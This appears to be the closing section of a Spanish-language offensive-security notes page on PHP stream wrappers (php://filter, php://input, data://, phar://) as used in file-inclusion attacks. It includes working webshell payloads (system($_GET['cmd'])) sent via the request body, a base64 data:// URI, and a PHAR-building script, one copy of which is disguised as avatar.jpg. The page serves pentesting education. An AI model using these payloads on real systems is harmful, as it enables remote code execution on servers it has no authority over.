+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PD9waHAKJGRiX3VzZXIgPSAn...</span></span></code></pre>
+<p>Después de decodificarlo se obtiene el source original.</p>
+<p>El valor ofensivo del wrapper está en poder transformar un fichero antes de que lo procese el sink. En un include, esto puede permitir recuperar source que una inclusión directa ejecutaría.</p>
+<p><code>php://filter</code> no está restringido por <code>allow_url_fopen</code>.</p>
+<h3 id="phpinput"><code>php://input</code></h3>
+<p><code>php://input</code> expone el cuerpo HTTP raw como un stream de solo lectura.</p>
+<p>Si una aplicación permite controlar el argumento de un include:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">include</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'page'</span><span style="color:#E6EDF3">]);</span></span></code></pre>
+<p>y la configuración permite incluir este tipo de stream, el request body puede actuar como contenido del recurso:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">POST</span><span style="color:#E6EDF3"> /?page=php://input </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span>
+<span class="line"><span style="color:#7EE787">Content-Type</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> text/plain</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">&#x3C;?</span><span style="color:#7EE787">php</span><span style="color:#79C0FF"> system</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'cmd'</span><span style="color:#E6EDF3">]); ?></span></span></code></pre>
+<p>con:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>?cmd=id</span></span></code></pre>
+<p><code>php://input</code> está sujeto a <code>allow_url_include</code> cuando se utiliza mediante <code>include</code>/<code>require</code>. Además, no está disponible para requests <code>multipart/form-data</code> cuando <code>enable_post_data_reading</code> está activado.</p>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Dependencia de configuración</strong><p>Los wrappers que pueden transportar código no deben asumirse explotables por defecto. El sink concreto y las directivas que afectan a inclusión de URLs/streams determinan si el contenido será leído, incluido o rechazado.</p></aside>
+<h3 id="data"><code>data://</code></h3>
+<p><code>data://</code> representa datos directamente dentro de la URI.</p>
+<p>En el mismo sink:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">include</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'page'</span><span style="color:#E6EDF3">]);</span></span></code></pre>
+<p>puede utilizarse un recurso similar a:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</span></span></code></pre>
+<p>El Base64 representa:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span><span style="color:#79C0FF"> system</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'cmd'</span><span style="color:#E6EDF3">]); </span><span style="color:#FF7B72">?></span></span></code></pre>
+<p>y el request puede añadir:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>&#x26;cmd=id</span></span></code></pre>
+<p><code>data://</code> está restringido por <code>allow_url_fopen</code> y <code>allow_url_include</code>. <code>allow_url_include</code> está desactivado por defecto y deprecado desde PHP 7.4, por lo que esta técnica depende de una configuración que no debe darse por supuesta.</p>
+<h3 id="phar"><code>phar://</code></h3>
+<p><code>phar://</code> expone los miembros internos de un <strong>PHP Archive (PHAR)</strong> mediante el sistema de streams.</p>
+<p>Un archive puede contener:</p>
+<div class="pub-filetree"><strong class="pub-filetree-title">payload.phar</strong><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>payload.phar</span></span>
+<span class="line"><span>└── payload.php</span></span></code></pre></div>
+<p>y el miembro interno puede direccionarse como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>phar:///tmp/payload.phar/payload.php</span></span></code></pre>
+<p>Un PHAR mínimo puede prepararse en la máquina del pentester:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$phar </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> new</span><span style="color:#79C0FF"> Phar</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'payload.phar'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$phar</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">startBuffering</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#E6EDF3">$phar</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">setStub</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">'&#x3C;?php __HALT_COMPILER(); ?>'</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$phar[</span><span style="color:#A5D6FF">'payload.php'</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> &#x3C;&#x3C;&#x3C;'</span><span style="color:#FF7B72">PHP</span><span style="color:#A5D6FF">'</span></span>
+<span class="line"><span style="color:#A5D6FF">&#x3C;?php system($_GET['cmd']); ?></span></span>
+<span class="line"><span style="color:#FF7B72">PHP</span><span style="color:#E6EDF3">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$phar</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">stopBuffering</span><span style="color:#E6EDF3">();</span></span></code></pre>
+<p>La creación requiere permitir escritura de PHAR en ese entorno:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">php</span><span style="color:#79C0FF"> -d</span><span style="color:#A5D6FF"> phar.readonly=</span><span style="color:#79C0FF">0</span><span style="color:#A5D6FF"> build.php</span></span></code></pre>
+<p>Esta directiva afecta a la construcción del archive, no a la lectura del fichero en el target.</p>
+<p>Si la aplicación permite colocar el archivo en el servidor y existe un include controlable:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">&#x3C;?</span><span style="color:#79C0FF">php</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">include</span><span style="color:#E6EDF3">($_GET[</span><span style="color:#A5D6FF">'page'</span><span style="color:#E6EDF3">]);</span></span></code></pre>
+<p>el probe puede apuntar al miembro interno:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /?page=phar:///var/www/uploads/payload.phar/payload.php&#x26;cmd=id </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> target</span></span></code></pre>
+<p><code>phar://</code> no está restringido por <code>allow_url_fopen</code> ni por <code>allow_url_include</code>.</p>
+<p>La extensión exterior tampoco tiene que revelar necesariamente el formato real. En una reproducción con PHP 8.4.23, los mismos bytes PHAR renombrados como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>avatar.jpg</span></span></code></pre>
+<p>seguían siendo accesibles mediante:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#FF7B72">include</span><span style="color:#A5D6FF"> 'phar:///tmp/avatar.jpg/payload.php'</span><span style="color:#E6EDF3">;</span></span></code></pre>
+<p>y el miembro PHP interno se ejecutaba.</p>
+<p>La condición ofensiva pasa a ser:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>attacker-controlled file on disk</span></span>
+<span class="line"><span>             +</span></span>
+<span class="line"><span>controllable path/include sink</span></span>
+<span class="line"><span>             ↓</span></span>
+<span class="line"><span>phar://uploaded-file/internal-member</span></span></code></pre>
+<p>No cualquier upload es suficiente. Tiene que existir un archive válido, una ruta local alcanzable y un sink cuya operación sobre el stream resulte útil.</p>
+<details>
+<summary><strong>Histórico: deserialización automática de metadata PHAR antes de PHP 8</strong></summary>
+<p><code>phar://</code> también aparece en documentación ofensiva por una técnica distinta: <strong>automatic metadata deserialization</strong>.</p>
+<p>Antes de PHP 8, determinadas operaciones de filesystem sobre un PHAR podían provocar la deserialización automática de la metadata del archive:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>attacker-controlled PHAR</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>file_exists("phar://...")</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>automatic unserialize(metadata)</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>object instantiation</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>magic methods / gadget chain</span></span></code></pre>
+<p>La importancia era que no hacía falta encontrar una llamada explícita a <code>unserialize()</code>.</p>
+<p>PHP 8 eliminó este comportamiento automático. Abrir o inspeccionar un PHAR mediante el stream wrapper ya no deserializa por sí solo la metadata. La deserialización puede producirse cuando el código llama explícitamente a:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#E6EDF3">$phar</span><span style="color:#FF7B72">-></span><span style="color:#D2A8FF">getMetadata</span><span style="color:#E6EDF3">();</span></span></code></pre>
+<p><code>Phar::getMetadata()</code> advierte actualmente que acceder a metadata puede disparar deserialización y, por tanto, ejecución mediante objetos disponibles.</p>
+<p>El análisis completo de <code>unserialize()</code>, magic methods y gadget chains pertenece a una futura Note de <strong>PHP Object Injection</strong>.</p>
+</details>
+<p>La explotación completa de LFI/RFI, uploads, logs, sessions y cadenas de inclusión merece una Note específica de <strong>File Inclusion</strong>. Aquí el punto relevante es reconocer las semánticas adicionales que PHP introduce cuando un input alcanza una operación sobre paths o streams.</p>
+<h2 id="referencias">Referencias</h2>
+<ul>
+<li><a href="https://www.php.net/manual/en/language.variables.external.php">PHP Manual — Variables From External Sources</a></li>
+<li><a href="https://www.php.net/manual/en/reserved.variables.request.php">PHP Manual — <code>$_REQUEST</code></a></li>
+<li><a href="https://www.php.net/manual/en/ini.core.php">PHP Manual — Core <code>request_order</code> and <code>variables_order</code> configuration</a></li>
+<li><a href="https://www.php.net/manual/en/language.operators.comparison.php">PHP Manual — Comparison Operators</a></li>
+<li><a href="https://www.php.net/manual/en/language.types.numeric-strings.php">PHP Manual — Numeric Strings</a></li>
+<li><a href="https://www.php.net/manual/en/function.in-array.php">PHP Manual — <code>in_array()</code></a></li>
+<li><a href="https://www.php.net/manual/en/function.strpos.php">PHP Manual — <code>strpos()</code></a></li>
+<li><a href="https://www.php.net/manual/en/function.strcmp.php">PHP Manual — <code>strcmp()</code></a></li>
+<li><a href="https://wiki.php.net/rfc/string_to_number_comparison">PHP RFC — Saner string to number comparisons</a></li>
+<li><a href="https://wiki.php.net/rfc/consistent_type_errors">PHP RFC — Consistent type errors for internal functions</a></li>
+<li><a href="https://www.php.net/manual/en/function.eval.php">PHP Manual — <code>eval()</code></a></li>
+<li><a href="https://www.php.net/manual/en/function.addslashes.php">PHP Manual — <code>addslashes()</code></a></li>
+<li><a href="https://www.php.net/manual/en/language.types.string.php">PHP Manual — Strings</a></li>
+<li><a href="https://wiki.php.net/rfc/deprecate_dollar_brace_string_interpolation">PHP RFC — Deprecate <code>${}</code> string interpolation</a></li>
+<li><a href="https://www.php.net/manual/en/wrappers.php.php">PHP Manual — <code>php://</code></a></li>
+<li><a href="https://www.php.net/manual/en/wrappers.data.php">PHP Manual — <code>data://</code></a></li>
+<li><a href="https://www.php.net/manual/en/wrappers.phar.php">PHP Manual — <code>phar://</code></a></li>
+<li><a href="https://www.php.net/manual/en/phar.getmetadata.php">PHP Manual — <code>Phar::getMetadata()</code></a></li>
+<li><a href="https://wiki.php.net/rfc/phar_stop_autoloading_metadata">PHP RFC — Don’t automatically unserialize Phar metadata outside <code>getMetadata()</code></a></li>
+</ul></div></article><aside class="notes-toc" aria-label="En esta página"><strong>En esta página</strong><ul><li data-depth="2"><a href="#parsing-de-parámetros">Parsing de parámetros</a></li><li data-depth="3"><a href="#scalars-y-arrays">Scalars y arrays</a></li><li data-depth="3"><a href="#parámetros-duplicados-y-colisiones-scalar-array">Parámetros duplicados y colisiones scalar-array</a></li><li data-depth="3"><a href="#normalización-de-nombres-de-parámetros">Normalización de nombres de parámetros</a></li><li data-depth="3"><a href="#precedencia-de-_request">Precedencia de $_REQUEST</a></li><li data-depth="2"><a href="#comparaciones-laxas">Comparaciones laxas</a></li><li data-depth="3"><a href="#strings-numéricos-y-magic-hashes">Strings numéricos y magic hashes</a></li><li data-depth="3"><a href="#comprobaciones-laxas-de-pertenencia">Comprobaciones laxas de pertenencia</a></li><li data-depth="3"><a href="#valores-falsey-y-valores-centinela">Valores falsey y valores centinela</a></li><li data-depth="2"><a href="#evaluación-dinámica">Evaluación dinámica</a></li><li data-depth="3"><a href="#contexto-del-código-generado">Contexto del código generado</a></li><li data-depth="3"><a href="#addslashes-e-interpolación-de-strings">addslashes() e interpolación de strings</a></li><li data-depth="2"><a href="#wrappers-de-streams">Wrappers de streams</a></li><li data-depth="3"><a href="#phpfilter">php://filter</a></li><li data-depth="3"><a href="#phpinput">php://input</a></li><li data-depth="3"><a href="#data">data://</a></li><li data-depth="3"><a href="#phar">phar://</a></li><li data-depth="2"><a href="#referencias">Referencias</a></li></ul></aside></div></div></div><script>
+    (() => {
+      const root = document.querySelector('.notes-page');
+      if (!root) return;
+      const tocLinks = [...root.querySelectorAll('.notes-toc a')];
+      const targets = tocLinks.map((link) => document.getElementById(decodeURIComponent(link.hash.slice(1)))).filter(Boolean);
+      const markCurrent = (link, active) => active ? link.setAttribute('aria-current', 'location') : link.removeAttribute('aria-current');
+      tocLinks.forEach((selected) => selected.addEventListener('click', () => tocLinks.forEach((link) => markCurrent(link, link === selected))));
+      if (targets.length) {
+        const updateActiveHeading = () => {
+          const active = targets.reduce((current, target) => target.getBoundingClientRect().top <= 150 ? target : current, targets[0]);
+          tocLinks.forEach((link) => markCurrent(link, link.hash === `#${active.id}`));
+        };
+        updateActiveHeading();
+        window.addEventListener('scroll', updateActiveHeading, { passive:true });
+      }
+    })();
+  </script></main><footer class="site-footer"><div class="footer-inner"><a class="footer-wordmark" href="/es/">dful<span>.</span></a><span>Offensive Security · AI Security · Agentic Systems</span></div></footer><script>
+  (() => {
+    const init = () => {
+      const figures = [...document.querySelectorAll('.publishing-prose .pub-figure[data-preview="true"]')];
+      if (!figures.length) return;
+
+      const spanish = document.documentElement.lang === 'es';
+      const labels = spanish
+        ? {
+            open: 'Abrir vista ampliada',
+            close: 'Cerrar vista previa',
+            zoom: 'Zoom de imagen',
+            fit: 'Ajustar',
+            actual: 'Tamaño real',
+          }
+        : {
+            open: 'Open enlarged preview',
+            close: 'Close preview',
+            zoom: 'Image zoom',
+            fit: 'Fit',
+            actual: 'Actual size',
+          };
+
+      let dialog = document.querySelector('dialog[data-figure-preview]');
+      if (!(dialog instanceof HTMLDialogElement)) {
+        dialog = document.createElement('dialog');
+        dialog.className = 'figure-preview-dialog';
+        dialog.setAttribute('data-figure-preview', 'true');
+        dialog.dataset.mode = 'fit';
+
+        const toolbar = document.createElement('div');
+        toolbar.className = 'figure-preview-toolbar';
+
+        const modeGroup = document.createElement('div');
+        modeGroup.className = 'figure-preview-modes';
+        modeGroup.setAttribute('role', 'group');
+        modeGroup.setAttribute('aria-label', labels.zoom);
+
+        const fit = document.createElement('button');
+        fit.type = 'button';
+        fit.className = 'figure-preview-mode';
+        fit.setAttribute('data-figure-preview-fit', 'true');
+        fit.setAttribute('aria-pressed', 'true');
+        fit.textContent = labels.fit;
+
+        const actual = document.createElement('button');
+        actual.type = 'button';
+        actual.className = 'figure-preview-mode';
+        actual.setAttribute('data-figure-preview-actual', 'true');
+        actual.setAttribute('aria-pressed', 'false');
+        actual.setAttribute('title', labels.actual);
+        actual.textContent = '1:1';
+
+        const close = document.createElement('button');
+        close.type = 'button';
+        close.className = 'figure-preview-close';
+        close.setAttribute('data-figure-preview-close', 'true');
+        close.setAttribute('aria-label', labels.close);
+        close.textContent = '×';
+
+        const viewport = document.createElement('div');
+        viewport.className = 'figure-preview-viewport';
+        viewport.setAttribute('data-figure-preview-viewport', 'true');
+
+        const image = document.createElement('img');
+        image.className = 'figure-preview-image';
+        viewport.appendChild(image);
+
+        const caption = document.createElement('p');
+        caption.className = 'figure-preview-caption';
+        caption.id = 'figure-preview-caption';
+
+        modeGroup.append(fit, actual);
+        toolbar.append(modeGroup, close);
+        dialog.append(toolbar, viewport, caption);
+        document.body.appendChild(dialog);
+
+        const setMode = (mode) => {
+          const native = mode === 'native';
+          dialog.dataset.mode = native ? 'native' : 'fit';
+          fit.setAttribute('aria-pressed', native ? 'false' : 'true');
+          actual.setAttribute('aria-pressed', native ? 'true' : 'false');
+          if (!native) viewport.scrollTo({ top: 0, left: 0 });
+        };
+
+        fit.addEventListener('click', () => setMode('fit'));
+        actual.addEventListener('click', () => setMode('native'));
+        close.addEventListener('click', () => dialog.close());
+        dialog.addEventListener('click', (event) => {
+          if (event.target !== dialog) return;
+          const rect = dialog.getBoundingClientRect();
+          const outside = event.clientX < rect.left || event.clientX > rect.right || event.clientY < rect.top || event.clientY > rect.bottom;
+          if (outside) dialog.close();
+        });
+        dialog.addEventListener('close', () => {
+          setMode('fit');
+          const trigger = dialog.dataset.lastTrigger;
+          const source = trigger ? document.querySelector(`[data-preview-trigger="${trigger}"]`) : null;
+          if (source instanceof HTMLButtonElement) source.focus();
+          delete dialog.dataset.lastTrigger;
+        });
+      }
+
+      const close = dialog.querySelector('[data-figure-preview-close]');
+      const fit = dialog.querySelector('[data-figure-preview-fit]');
+      const actual = dialog.querySelector('[data-figure-preview-actual]');
+      const previewImage = dialog.querySelector('.figure-preview-image');
+      const viewport = dialog.querySelector('[data-figure-preview-viewport]');
+      const caption = dialog.querySelector('.figure-preview-caption');
+      if (!(close instanceof HTMLButtonElement) || !(fit instanceof HTMLButtonElement) || !(actual instanceof HTMLButtonElement) || !(previewImage instanceof HTMLImageElement) || !(viewport instanceof HTMLDivElement) || !(caption instanceof HTMLParagraphElement)) return;
+
+      const largestSource = (image) => {
+        const candidates = (image.srcset || '')
+          .split(',')
+          .map((candidate) => candidate.trim())
+          .filter(Boolean)
+          .map((candidate) => {
+            const parts = candidate.split(/\s+/);
+            const descriptor = parts.length > 1 ? parts.pop() : '';
+            const url = parts.join(' ') || candidate;
+            let score = 0;
+            if (descriptor.endsWith('w')) score = Number.parseFloat(descriptor);
+            else if (descriptor.endsWith('x')) score = Number.parseFloat(descriptor) * (image.naturalWidth || 1);
+            return { url, score: Number.isFinite(score) ? score : 0 };
+          })
+          .sort((a, b) => b.score - a.score);
+        return candidates[0]?.url || image.currentSrc || image.src;
+      };
+
+      figures.forEach((figure, index) => {
+        const image = figure.querySelector('img');
+        if (!(image instanceof HTMLImageElement) || figure.querySelector('[data-preview-trigger]')) return;
+
+        const trigger = document.createElement('button');
+        trigger.type = 'button';
+        trigger.className = 'figure-preview-trigger';
+        const triggerId = `figure-preview-trigger-${index + 1}`;
+        trigger.setAttribute('data-preview-trigger', triggerId);
+        const alt = image.alt || (spanish ? 'Imagen técnica' : 'Technical image');
+        trigger.setAttribute('aria-label', `${labels.open}: ${alt}`);
+        image.parentNode?.insertBefore(trigger, image);
+        trigger.appendChild(image);
+
+        trigger.addEventListener('click', () => {
+          previewImage.src = largestSource(image);
+          previewImage.alt = alt;
+          const figureCaption = figure.querySelector('figcaption')?.textContent?.trim() || alt;
+          caption.textContent = figureCaption;
+          dialog.setAttribute('aria-label', alt);
+          dialog.setAttribute('aria-describedby', caption.id);
+          dialog.dataset.lastTrigger = triggerId;
+          dialog.dataset.mode = 'fit';
+          fit.setAttribute('aria-pressed', 'true');
+          actual.setAttribute('aria-pressed', 'false');
+          viewport.scrollTo({ top: 0, left: 0 });
+
+          if (typeof dialog.showModal === 'function') {
+            dialog.showModal();
+            close.focus();
+          }
+        });
+      });
+    };
+
+    init();
+    document.addEventListener('astro:page-load', init);
+  })();
+</script><script type="module">var e=()=>{document.querySelectorAll(`.pub-tabs:not([data-enhanced])`).forEach((e,t)=>{e.setAttribute(`data-enhanced`,`true`);let n=[...e.querySelectorAll(`:scope > .pub-tab`)];if(!n.length)return;let r=document.createElement(`div`);r.className=`pub-tab-list`,r.setAttribute(`role`,`tablist`),n.forEach((e,i)=>{let a=`pub-tab-${t}-${i}`,o=`pub-tab-panel-${t}-${i}`,s=document.createElement(`button`);s.type=`button`,s.id=a,s.className=`pub-tab-button`,s.setAttribute(`role`,`tab`),s.setAttribute(`aria-controls`,o),s.setAttribute(`aria-selected`,i===0?`true`:`false`),s.tabIndex=i===0?0:-1,s.textContent=e.getAttribute(`data-tab-label`)||`Tab ${i+1}`,e.id=o,e.setAttribute(`role`,`tabpanel`),e.setAttribute(`aria-labelledby`,a),e.toggleAttribute(`hidden`,i!==0),s.addEventListener(`click`,()=>{[...r.querySelectorAll(`[role="tab"]`)].forEach(e=>{e.setAttribute(`aria-selected`,e===s?`true`:`false`),e.tabIndex=e===s?0:-1}),n.forEach(t=>t.toggleAttribute(`hidden`,t!==e)),s.focus()}),s.addEventListener(`keydown`,e=>{let t=[...r.querySelectorAll(`[role="tab"]`)],n=t.indexOf(s),i=n;if(e.key===`ArrowRight`)i=(n+1)%t.length;else if(e.key===`ArrowLeft`)i=(n-1+t.length)%t.length;else if(e.key===`Home`)i=0;else if(e.key===`End`)i=t.length-1;else return;e.preventDefault(),t[i].click()}),r.appendChild(s)}),e.prepend(r)})};e(),document.addEventListener(`astro:page-load`,e);</script><script type="module">var e=()=>{let e=document.documentElement.lang===`es`?{copy:`Copiar`,copied:`Copiado`}:{copy:`Copy`,copied:`Copied`};document.querySelectorAll(`pre`).forEach(t=>{if(t.closest(`.pub-filetree`)||t.parentElement?.classList.contains(`code-frame`))return;let n=document.createElement(`div`);n.className=`code-frame`,t.parentNode?.insertBefore(n,t),n.appendChild(t);let r=t.dataset.language??t.querySelector(`code`)?.className.match(/language-([\w-]+)/)?.[1];if(r){let e=document.createElement(`span`);e.className=`code-language`,e.textContent=r===`powershell`?`PowerShell`:r,n.appendChild(e)}let i=document.createElement(`button`);i.className=`copy-code`,i.type=`button`,i.textContent=e.copy,i.addEventListener(`click`,async()=>{try{await navigator.clipboard.writeText(t.textContent??``),i.textContent=e.copied,window.setTimeout(()=>{i.textContent=e.copy},1400)}catch{i.textContent=e.copy}}),n.appendChild(i)})};e(),document.addEventListener(`astro:page-load`,e);</script></body></html>
